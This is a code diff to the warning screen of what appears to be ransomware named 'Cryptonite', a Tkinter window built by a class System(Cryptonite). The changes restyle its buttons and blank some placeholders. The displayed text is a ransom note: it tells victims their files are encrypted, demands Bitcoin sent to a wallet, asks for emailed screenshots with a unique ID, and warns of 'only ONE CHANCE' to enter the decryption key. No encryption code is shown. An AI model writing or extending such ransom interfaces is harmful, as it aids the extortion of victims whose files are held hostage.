@@ -138,6 +138,7 @@ class System(Cryptonite):
 
     def warningScreen(self):
         import tkinter as tk
+        import tkinter.ttk as ttk
         from tkinter.filedialog import askopenfilename
         window = tk.Tk()
 
@@ -183,12 +184,16 @@ class System(Cryptonite):
 
 
 
+        
         window.title("Cryptonite")
+        window.resizable(0,0)
+        window.rowconfigure(0, minsize = 700)
+        window.columnconfigure(0, minsize = 1000)
+        window.columnconfigure(1, minsize = 300)
 
-        window.rowconfigure(0, minsize = 700, weight = 1)
-        window.columnconfigure(0, minsize = 1000, weight = 1)
-        window.columnconfigure(1, minsize = 300, weight = 1)
-
+        style = ttk.Style()
+        style.configure('TButton', font=("Apple Chancery", 18))
+        style.configure('small.TButton', font=("Apple Chancery", 8))
 
         frm_main = tk.Frame(master = window, bg = "black")
         frm_main.grid(row = 0, column = 0, sticky = "nsew", padx = 2, pady = 2)
@@ -205,7 +210,7 @@ class System(Cryptonite):
         decryption_key.grid(row = 2, column = 0, columnspan = 1, sticky = "e")
         decryption_key.insert("0", "DECRYPTION_KEY")
         decryption_key.bind("<Button-1>", clear1)
-        decryption_key_button = tk.Button(master = frm_main, text = "Submit", font=("Apple Chancery", 18), relief = tk.RAISED, borderwidth = 2, command = key_collect)
+        decryption_key_button = ttk.Button(style = 'TButton', master = frm_main, text = "Submit", command = key_collect)
         decryption_key_button.grid(row = 2, column = 1, sticky = "w", padx = 5)
         lbl_main1 = tk.Label(master = frm_main, text = "It uses military grade encryption to encrypt your files. It requires a DECRYPTION_KEY for decryption process.\nIf you think its a joke, try opening up your files from the file viewer on the right hand side of this frame.", font=("Apple Chancery", 15), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 3, column = 0, columnspan = 2)
@@ -215,9 +220,9 @@ class System(Cryptonite):
         lbl_main1.grid(row = 5, column = 0, columnspan = 2)
         lbl_main1 = tk.Label(master = frm_main, text = "Don't worry! Your files can still be decrypted.\nYou just need to put in the correct DECRYPTION_KEY in the text box provided.\n\nIn order to get the DECRYPTION_KEY, 1. Send us the specified amount of BTC to the address mentioned below. 2. Send us the\nvalid screenshots via email along with your UNIQUE_ID. Do that and we will provide the correct DECRYPTION_KEY via mail.\n\nRemember! You will have only ONE CHANCE to enter the DECRYPTION_KEY.\n\nSo, do not try to be a Smart Alec.", font=("Apple Chancery", 15), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 6, column = 0, columnspan = 2)
-        lbl_main1 = tk.Label(master = frm_main, text = f"BTC AMOUNT: {BTC_AMOUNT}\tBTC WALLET: {BTC_WALLET}\tEMAIL: {EMAIL}\t", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
+        lbl_main1 = tk.Label(master = frm_main, text = f"BTC AMOUNT: \tBTC WALLET: \tEMAIL: \t", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 7, column = 0, sticky = "w", columnspan = 2)
-        lbl_main1 = tk.Label(master = frm_main, text = f"UNIQUE_ID: {self.uniqueKey}", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
+        lbl_main1 = tk.Label(master = frm_main, text = f"UNIQUE_ID: ", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
         lbl_main1.grid(row = 7, column = 0, sticky = "e", columnspan = 2)
 
         frm_editor = tk.Frame(bg = "black", master = window)
@@ -228,10 +233,10 @@ class System(Cryptonite):
         frm_editor.rowconfigure(1, minsize = 600, weight = 1)
 
 
-        btn_editor = tk.Button(master = frm_editor, text = "Open File", borderwidth = 2, command = open_file)
+        btn_editor = ttk.Button(master = frm_editor, text = "Open File", style = "small.TButton")
         btn_editor.grid(row = 0, column = 0, padx = 2, pady = 2, sticky = "e")
 
-        btn_editor1 = tk.Button(master = frm_editor, text = "Clear Screen", borderwidth = 2, command = clear)
+        btn_editor1 = ttk.Button(master = frm_editor, text = "Clear Screen", command = clear, style = "small.TButton")
         btn_editor1.grid(row = 0, column = 1, padx = 2, pady = 2, sticky = "ns")
 
         txt_editor = tk.Text(master = frm_editor)
